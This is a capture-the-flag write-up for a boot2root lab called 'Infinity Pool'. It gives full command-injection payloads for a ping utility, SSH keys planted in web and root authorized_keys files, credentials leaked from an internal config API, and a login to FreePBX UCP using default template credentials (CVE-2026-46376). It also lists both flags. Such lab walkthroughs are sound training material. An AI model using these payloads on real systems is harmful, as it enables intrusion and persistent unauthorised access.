# Title: Infinity Pool

#### Category: Boot2Root
#### Difficulty: Medium

#### Description: 

No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side.

---

## Task 1: Hacker Holidays Storyline: Act 3 - Reckoning

<img width="925" height="748" alt="image" src="https://github.com/user-attachments/assets/5e658250-1647-4756-bb97-8655fb740162" />

<img width="925" height="582" alt="image" src="https://github.com/user-attachments/assets/bb0deb48-e543-4d32-adac-4f6a58ff973a" />

#### Analysis: 
Reading between the lines of the storyline slides, this looks like it's setting up an attack narrative tied to a patch that was never applied. The "pattern" being referenced seems to be the attacker's method of entry — likely through a known vulnerability that should have been remediated but wasn't. My read is that the slides are foreshadowing that an attacker got in specifically because a patch was skipped or delayed, which lines up with what I ended up finding later in the CVE research below. 

---

## Task 2: Hacker Holidays: Day 11

<img width="473" height="633" alt="image" src="https://github.com/user-attachments/assets/4d50e7db-8b30-4632-bcb2-1ddfa740123c" />

#### Analysis

(Put something to this)

---

### Methodology


This challenge ultimately revolves around one CVE:
> CVE-2026-46376 Title: FreePBX — Unauthenticated Use of Hard-Coded Credentials Vulnerability in FreePBX UCP Interface

At first glance I didn't know this was the CVE in play — that only became clear later, once I found the version number and cross-referenced it against the vulnerability database. I'm walking through the process in order below, the same way I discovered it.


#### Step 1 – Access and Inspect the Website
Browsing to the target:
```http://<TARGET_IP>```

<img width="1906" height="802" alt="image" src="https://github.com/user-attachments/assets/3bfebc49-2cdd-4dcf-b062-df091582e22c" />

The reservation textbox is locked with a "reservations open soon" message, so direct interaction isn't possible yet. Time to look for another way in.

Inspecting the page source turns up an app.js file under the static folder:

<img width="1694" height="774" alt="image" src="https://github.com/user-attachments/assets/180c3bc7-e1f7-40bb-8c97-2af74c4daebd" />


#### Step 2 – Discover Hidden Endpoints via app.js

Accessing app.js directly reveals the internal structure of the site:

<img width="1916" height="773" alt="image" src="https://github.com/user-attachments/assets/15dad7a0-5a9b-4b28-b31f-4bf3db2ef22e" />

```
/status
/internal/netcheck
robots.txt 
```

The /status endpoint stands out — the accompanying text mentions a "staff connectivity pool," which is worth following up on.


#### Step 3 – Identify the Ping Utility

```<TARGET_IP>/status```

<img width="1910" height="564" alt="image" src="https://github.com/user-attachments/assets/6ace74a6-b9db-4180-b52e-9289685a10a3" />

The page description reads:
> "Confirm a remote property responds before routing a guest transfer."

In plain terms, this is a remote ping utility. Testing it against localhost:

```127.0.0.1```

<img width="961" height="433" alt="image" src="https://github.com/user-attachments/assets/cf6eca88-48fa-4aa3-a7aa-44b5319408dd" />

The ping succeeds, confirming the utility works as expected.


#### Step 4 – Confirm Command Injection

``` 127.0.0.1;id;# ```

<img width="913" height="438" alt="image" src="https://github.com/user-attachments/assets/8466b061-6f2d-4f4e-bae9-54c45c46514a" />

The output confirms command injection — the ping utility is passing input straight to a shell. We're executing as the web user rather than as admin/root, but this is enough to start pivoting.

#### Step 5 – Locate the User Flag

Let's try to look into its directory

```127.0.0.1;ls```

<img width="915" height="534" alt="image" src="https://github.com/user-attachments/assets/590fd64a-ab0a-4e44-bbe7-0f0c2d76a4cb" />

A valid response confirms the directory is readable, which means the user flag should also be reachable from here

```127.0.0.1;ls/home/web/```

This confirms the location of user.txt.


#### Step 6 – Generate an SSH Key for Persistence

Rather than continuing to inject one command at a time, it's more reliable to drop in an SSH key and get a proper shell.

Generate a temporary keypair:

```ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""```

<img width="666" height="464" alt="image" src="https://github.com/user-attachments/assets/d0c26366-a745-4855-8e44-b2b433fc40a4" />

Command: 
```cat ctf_key.pub```
Result:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSFYMxyUygiokJssjavQ3Ucd2PfuPY7EuqOLs01oXl8j+4REcM6nuL/6fwIUcpKQGzagfqzESqmTpF0ozATBZemwwxb0fAQaa56QxEmciWDkTTCZQewKmucyTmVsUZHoirEOOeB5BWnm19Fwt6zZSz/a7NTz83nB0cJtdaDl7EKn/7pU3ni7VvPn6AX12QFGJFjfNhxh4IM7x2Ylwgbeb5rjG4bJaKK3NmxiyoEfRn53WIQ61bCudNxdCpQV38GBlDnd7HI8iNXox6iQdSvtRz65MlTSBSLSKJ5fZZzb0Qfs7JR28qTa95ND5QUCnsXlR9H+bDnmzDLuGcxP/q3h9 chrztndclz@chrztndclz
```

Encode the public key in base64 so it can be safely delivered through the injection point:

Command"
```base64 -w0 ctf_key.pub```
Result:
```
c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFESFNGWU14eVV5Z2lva0pzc2phdlEzVWNkMlBmdVBZN0V1cU9MczAxb1hsOGorNFJFY002bnVMLzZmd0lVY3BLUUd6YWdmcXpFU3FtVHBGMG96QVRCWmVtd3d4YjBmQVFhYTU2UXhFbWNpV0RrVFRDWlFld0ttdWN5VG1Wc1VaSG9pckVPT2VCNUJXbm0xOUZ3dDZ6WlN6L2E3TlR6ODNuQjBjSnRkYURsN0VLbi83cFUzbmk3VnZQbjZBWDEyUUZHSkZqZk5oeGg0SU03eDJZbHdnYmViNXJqRzRiSmFLSzNObXhpeW9FZlJuNTNXSVE2MWJDdWROeGRDcFFWMzhHQmxEbmQ3SEk4aU5Yb3g2aVFkU3Z0Uno2NU1sVFNCU0xTS0o1ZlpaemIwUWZzN0pSMjhxVGE5NU5ENVFVQ25zWGxSOUgrYkRubXpETHVHY3hQL3EzaDkgY2hyenRuZGNsekBjaHJ6dG5kY2x6Cg==
```

<img width="652" height="178" alt="image" src="https://github.com/user-attachments/assets/b99120f6-68a3-4d48-a14d-33dd3c4a27b5" />


#### Step 7 – Inject the SSH Key via Command Injection

Using the base64 blob from Step 6, drop the key into authorized_keys for the web user:


Template:
```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo <paste_base64_key>|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```

Actual payload used:
```
host=127.0.0.1;mkdir -p /home/web/.ssh;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFESFNGWU14eVV5Z2lva0pzc2phdlEzVWNkMlBmdVBZN0V1cU9MczAxb1hsOGorNFJFY002bnVMLzZmd0lVY3BLUUd6YWdmcXpFU3FtVHBGMG96QVRCWmVtd3d4YjBmQVFhYTU2UXhFbWNpV0RrVFRDWlFld0ttdWN5VG1Wc1VaSG9pckVPT2VCNUJXbm0xOUZ3dDZ6WlN6L2E3TlR6ODNuQjBjSnRkYURsN0VLbi83cFUzbmk3VnZQbjZBWDEyUUZHSkZqZk5oeGg0SU03eDJZbHdnYmViNXJqRzRiSmFLSzNObXhpeW9FZlJuNTNXSVE2MWJDdWROeGRDcFFWMzhHQmxEbmQ3SEk4aU5Yb3g2aVFkU3Z0Uno2NU1sVFNCU0xTS0o1ZlpaemIwUWZzN0pSMjhxVGE5NU5ENVFVQ25zWGxSOUgrYkRubXpETHVHY3hQL3EzaDkgY2hyenRuZGNsekBjaHJ6dG5kY2x6Cg==|base64 -d > /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#
```

Submitting this through the ping utility on the website:

<img width="947" height="366" alt="image" src="https://github.com/user-attachments/assets/f793b650-4a80-423c-a3a3-f30c5503ce8b" />


#### Step 8 – SSH into the Target and Retrieve the User Flag

```ssh -o IdentitiesOnly=yes -i ctf_key web@<VICTIM_IP>```

<img width="658" height="632" alt="image" src="https://github.com/user-attachments/assets/6c6d8a55-11e9-4c5e-ac7c-678129175b64" />

We're now in via a proper shell. Time to explore.

```
id
ls
cat user.txt
```

<img width="457" height="172" alt="image" src="https://github.com/user-attachments/assets/46f387c4-57cd-413e-bf0f-70284b9a7df6" />

User flag captured.


#### Step 9 – Enumerate Running Processes for Privilege Escalation

Before the flag can be root's, an authentication token or a path to root needs to be found first.

```ps auxww```

<img width="1700" height="57" alt="image" src="https://github.com/user-attachments/assets/9ae46b2c-ae6f-4d2a-a767-1752c2520a98" />

One process stands out — it's running from a directory sitting right next to ours. Trying to navigate into it directly fails due to permissions, so another route is needed.


#### Step 10 – Investigate Watchtower via Systemd

```ls -la /etc/systemd/system/```

<img width="566" height="169" alt="image" src="https://github.com/user-attachments/assets/c62a8482-d561-44f4-8ed8-90f8d835547e" />

The service file's permissions make it world-readable, so it's worth a look.

```
cat /etc/systemd/system/cc-watchtower.service
```

```
web@tryhackme-2404:/var/www/infinitycat /etc/systemd/system/cc-watchtower.service
[Unit]
Description=Closed Circuit - Watchtower ops console (loopback)
After=network.target

[Service]
User=svc-watch
Group=svc-watch
WorkingDirectory=/var/www/infinity_pool/watchtower
ExecStart=/var/www/infinity_pool/watchtower/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:3000 wsgi:app
Restart=on-failure
RestartSec=2

[Install]
WantedBy=multi-user.target

```
This confirms the important details: Watchtower runs as svc-watch (not root), it lives at /var/www/infinity_pool/watchtower, and Gunicorn binds it strictly to 127.0.0.1:3000 — loopback only. So there's an internal web app here, reachable only from the box itself, and now we're on the box.


#### Step 11 – Query the Root-Owned Watchtower Service

```curl -sS http://127.0.0.1:3000/```

```
web@tryhackme-2404:/var/www/infinity_pool$ curl -i http://127.0.0.1:3000/
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 08 Aug 2026 06:37:44 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1294

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Watchtower &mdash; ops console</title>
<style>
  body{margin:0;background:#0a0b0e;color:#e7e9ee;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
  header{padding:16px 24px;border-bottom:1px solid #262a31;letter-spacing:.2em}
  main{max-width:760px;margin:0 auto;padding:40px 24px}
  .tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:20px}
  .tile{background:#15171c;border:1px solid #262a31;border-radius:10px;padding:18px}
  .tile b{display:block;font-size:1.6rem}
  .muted{color:#8b909b}
  code{color:#c9a24b}
</style>
</head>
<body>
<header>WATCHTOWER &middot; <span class="muted">internal</span></header>
<main>
  <h1>Surveillance operations</h1>
  <p class="muted">Loopback-only console. Authenticated by network position.</p>
  <div class="tiles">
    <div class="tile"><b>1184</b><span class="muted">active feeds</span></div>
    <div class="tile"><b>OK</b><span class="muted">datastore link</span></div>
    <div class="tile"><b>root</b><span class="muted">automation worker</span></div>
  </div>
  <p class="muted" style="margin-top:28px">
    Service endpoints: <code>/api/health</code> &middot; <code>/api/config</code>
  </p>
</main>
</body>
</html>w
```

Two service endpoints are exposed:
```
  /api/health
  /api/config
```

/api/config is the more interesting target — configuration data tends to leak service names, database details, file paths, ports, and other internal settings.


#### Step 12 – Extract Credentials from /api/config

```curl -i http://127.0.0.1:3000/api/config```

```
web@tryhackme-2404:/var/www/infinity_pool$ curl -i http://127.0.0.1:3000/api/config
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 08 Aug 2026 06:48:28 GMT
Connection: close
Content-Type: application/json
Content-Length: 312

{"automation_endpoint":"http://127.0.0.1:9000","note":"internal network only -- do not expose","ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.","telephony_pass":"St4yN0t1c3d_2026","telephony_portal":"http://127.0.0.1:8080/ucp","telephony_user":"FreePBXUCPTemplateCreator"}

```
This is a jackpot. The Watchtower config leaks:

- An internal automation service on 127.0.0.1:9000
- A telephony/UCP service on 127.0.0.1:8080/ucp
- A username and password for that UCP service


#### Step 13 – Confirm the FreePBX Vulnerability (CVE-2026-46376)

The credential username, FreePBXUCPTemplateCreator, along with the ops_note warning about default template creds, points directly to CVE-2026-46376:

> FreePBX is an open source IP PBX. From 15.0.42 to before 16.0.45 and 17.0.7, unauthenticated users may be able to access the User Control Panel (UCP) using hard-coded initial template credentials if these were not immediately changed by the administrator who enabled UCP.

To confirm the target version is actually affected:

```grep -i version /var/www/html/admin/modules/ucp/module.xml```

```
web@tryhackme-2404:/var/www/infinity_pool$ grep -i version /var/www/html/admin/modules/ucp/module.xml
	<version>16.0.39</version>
		<version>16.0</version>
		<version>16.0.37</version>
```

Version 16.0.39 falls inside the vulnerable range — confirmed exploitable.


#### Step 14 – Exploit via SSH Port Forwarding

Since the UCP portal is loopback-only, it needs to be tunneled out through the existing SSH session. Open a second terminal and keep it running:

```
ssh -o IdentitiesOnly=yes -i ctf_key \
  -L 8080:127.0.0.1:8080 \
  web@10.48.166.151
```

<img width="957" height="578" alt="image" src="https://github.com/user-attachments/assets/cf3747c2-1c99-4cae-aa51-402b673ee953" />

With the tunnel up, browse to:

```http://127.0.0.1:8080/ucp/```


Log in with the credentials pulled from /api/config:
```
"telephony_user":"FreePBXUCPTemplateCreator"
"telephony_pass":"St4yN0t1c3d_2026"
```

<img width="1907" height="766" alt="image" src="https://github.com/user-attachments/assets/7a337d47-e27d-4454-a7f9-33c72601dcdf" />


<img width="388" height="473" alt="image" src="https://github.com/user-attachments/assets/15860ded-afcc-48ab-8ab7-3812c852f9f4" />


#### Step 15 – Retrieve the Automation Key

Exploring the UCP dashboard, a key was sitting in the Voicemail widget once added:

<img width="1118" height="757" alt="image" src="https://github.com/user-attachments/assets/a48b173f-9081-4ea9-bb91-38d68010a5a2" />

> "Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>

This is exactly what's needed to authenticate against the automation service found earlier on port 9000.


#### Step 16 – Escalate to Root via the Automation Endpoint

Back in the terminal that still has access to the UCP tunnel, use the automation key to hit the /jobs/export endpoint and inject a second SSH key — this time for root. (Same base64-encoded key used in Step 6.)

```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;mkdir -p /root/.ssh;echo c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFESFNGWU14eVV5Z2lva0pzc2phdlEzVWNkMlBmdVBZN0V1cU9MczAxb1hsOGorNFJFY002bnVMLzZmd0lVY3BLUUd6YWdmcXpFU3FtVHBGMG96QVRCWmVtd3d4YjBmQVFhYTU2UXhFbWNpV0RrVFRDWlFld0ttdWN5VG1Wc1VaSG9pckVPT2VCNUJXbm0xOUZ3dDZ6WlN6L2E3TlR6ODNuQjBjSnRkYURsN0VLbi83cFUzbmk3VnZQbjZBWDEyUUZHSkZqZk5oeGg0SU03eDJZbHdnYmViNXJqRzRiSmFLSzNObXhpeW9FZlJuNTNXSVE2MWJDdWROeGRDcFFWMzhHQmxEbmQ3SEk4aU5Yb3g2aVFkU3Z0Uno2NU1sVFNCU0xTS0o1ZlpaemIwUWZzN0pSMjhxVGE5NU5ENVFVQ25zWGxSOUgrYkRubXpETHVHY3hQL3EzaDkgY2hyenRuZGNsekBjaHJ6dG5kY2x6Cg==|base64 -d > /root/.ssh/authorized_keys;chmod 700 /root/.ssh;chmod 600 /root/.ssh/authorized_keys;#"}'
```
<img width="1919" height="186" alt="image" src="https://github.com/user-attachments/assets/ee22f78c-0b70-4cca-afc1-5ce60696b888" />


#### Step 17 – SSH as Root and Retrieve the Root Flag

Open a new terminal and SSH in directly as root:
```ssh -o IdentitiesOnly=yes -i ctf_key root@10.48.166.151```

<img width="955" height="773" alt="image" src="https://github.com/user-attachments/assets/0a52a9a1-8fa5-4d88-ab02-55fb7b3cc359" />

Root access confirmed. Navigate to root.txt:

<img width="1614" height="153" alt="image" src="https://github.com/user-attachments/assets/a8428bb4-1c74-4668-b8af-3d35d79e5215" />

---

### Today's Itinerary

1. Find the user flag
> Exploit command injection in the ping utility to gain a foothold as the `web` user, then retrieve the flag from their home directory.


2. Find the root flag
> Pivot through the internal Watchtower service to leak FreePBX credentials, exploit CVE-2026-46376 to reach the UCP automation key, and use it to escalate to root.

---

Attack Kill Chain:
1. Access and inspect the website
2. Discover the ping utility and confirm it's reachable
3. Confirm command injection in the ping utility
4. Locate the user flag
5. Generate an SSH key and inject it for the web account
6. SSH in as web and retrieve the user flag
7. Enumerate running processes to find a privilege escalation path
8. Identify the root-owned Watchtower automation service via systemd
9. Hit a dead end trying to access the automation directory directly (missing key)
10. Discover Watchtower is vulnerable and query its exposed API
11. Exploit the leaked FreePBX UCP credentials (CVE-2026-46376)
12. Retrieve the automation key from the UCP Voicemail widget
13. Use the automation key to inject an SSH key for root
14. SSH in as root and retrieve the root flag

---

### Attack Kill Chain (MITRE ATT&CK Mapped)

**Phase 1 — Reconnaissance & Initial Access**
| Step | Action | ATT&CK Tactic |
|---|---|---|
| 1 | Enumerated the target website and discovered exposed `app.js` revealing hidden endpoints | Reconnaissance (TA0043) |
| 2 | Identified a ping utility at `/status` accepting user input | Reconnaissance (TA0043) |
| 3 | Exploited unsanitized input to achieve OS command injection | Initial Access (TA0001) — T1190 (Exploit Public-Facing Application) |

**Phase 2 — Execution & Persistence**
| Step | Action | ATT&CK Tactic |
|---|---|---|
| 4 | Used command injection to enumerate the `web` user's home directory and locate the user flag | Discovery (TA0007) |
| 5 | Generated an SSH keypair and injected the public key via command injection to establish persistent access | Persistence (TA0003) — T1098.004 (SSH Authorized Keys) |
| 6 | Authenticated over SSH as `web` and retrieved the user flag | Execution (TA0002) |

**Phase 3 — Privilege Escalation & Credential Access**
| Step | Action | ATT&CK Tactic |
|---|---|---|
| 7 | Enumerated running processes and identified a root-owned Watchtower service via `ps auxww` | Discovery (TA0007) — T1057 (Process Discovery) |
| 8 | Reviewed systemd service configuration to map Watchtower's internal architecture | Discovery (TA0007) — T1007 |
| 9 | Queried Watchtower's internal API and extracted hard-coded FreePBX UCP credentials | Credential Access (TA0006) — T1552.001 (Credentials in Files) |
| 10 | Confirmed target was vulnerable to CVE-2026-46376 (FreePBX hard-coded template credentials) via version enumeration | Discovery (TA0007) |

**Phase 4 — Lateral Movement & Privilege Escalation to Root**
| Step | Action | ATT&CK Tactic |
|---|---|---|
| 11 | Pivoted to the loopback-only FreePBX UCP portal via SSH port forwarding | Lateral Movement (TA0008) — T1090 (Proxy) |
| 12 | Authenticated to UCP using leaked credentials and retrieved an internal automation API key | Credential Access (TA0006) |
| 13 | Abused the automation endpoint to inject an SSH key into `/root/.ssh/authorized_keys` | Privilege Escalation (TA0004) — T1098.004 |
| 14 | Authenticated as root via SSH and retrieved the root flag | Privilege Escalation (TA0004) |




### Flag
User Flag: 
> THM{n0_v1s1bl3_3dg3}

Root Flag: 
> THM{tr4c3d_t0_th3_h0r1z0n}

This box chained three separate weaknesses into a full compromise: a command injection bug in a public-facing ping utility, an internal Watchtower service that leaked hard-coded FreePBX credentials through its config endpoint, and a FreePBX UCP instance still running on default template credentials (CVE-2026-46376). None of these issues were exploitable in isolation from the outside — it was the pivot through each internal, loopback-only service that turned a low-privilege web shell into full root access.





